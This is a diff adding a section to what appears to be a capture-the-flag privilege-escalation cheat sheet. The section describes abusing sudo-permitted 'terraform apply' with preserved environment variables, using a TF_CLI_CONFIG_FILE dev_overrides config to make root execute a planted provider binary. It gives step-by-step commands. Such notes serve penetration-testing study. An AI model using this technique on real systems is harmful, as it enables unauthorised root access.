@@ -221,3 +221,47 @@ cat ./restore/root/root.txt
 
 ---
 
+## Terraform Provider Override Abuse
+
+### Example `sudo -l` Output
+```
+User jeremy may run the following commands on previous:
+    (root) /usr/bin/terraform -chdir=/opt/examples apply
+```
+
+> If `sudo -l` shows you can run **`terraform apply`** as root, you may be able to escalate.  
+> Terraform executes external **provider binaries** (e.g. `terraform-provider-examples`) during `apply`.  
+> With `!env_reset` in sudoers, environment variables survive, allowing you to override provider resolution with a malicious binary.
+
+- Terraform loads **providers** as local executables.  
+- You can use `TF_CLI_CONFIG_FILE` to point Terraform to a custom config file.  
+- With a **dev_overrides** in that file, you redirect Terraform to load a provider binary you control.  
+- When root’s Terraform runs, it executes **your binary as root**.  
+
+### Steps to Exploit
+1. Create `terraform.rc` with a `dev_overrides` pointing to your folder:
+   ```hcl
+   provider_installation {
+     dev_overrides {
+       "path/to/the/provider" = "/local/path/to/custom/provider"
+     }
+     direct {}
+   }
+   ```
+
+2. Export the config:
+   ```bash
+   export TF_CLI_CONFIG_FILE=/path/to/terraform.rc
+   ```
+
+3. Place a fake provider binary named `terraform-provider-examples` in `/local/path/to/custom/provider`.
+
+4. Run the allowed sudo command:
+   ```bash
+   sudo /usr/bin/terraform -chdir=/opt/examples apply
+   # type "yes" when prompted
+   ```
+
+5. Your binary is executed **as root** when Terraform loads the provider.
+
+---
